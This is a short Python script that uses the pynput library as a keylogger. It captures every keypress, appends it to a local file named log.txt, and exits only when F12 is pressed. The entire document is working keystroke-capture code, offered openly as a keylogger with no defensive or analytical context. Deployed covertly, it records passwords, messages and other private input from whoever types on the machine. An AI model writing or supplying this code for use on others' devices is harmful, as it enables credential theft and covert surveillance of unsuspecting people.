from pynput.keyboard import Listener

def keyLogger(key):
    key = str(key)
    key = key.replace("'", "")
    if key == 'Key.f12':
        raise SystemExit(0)

    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press=keyLogger) as Iceyzx:
    Iceyzx.join()
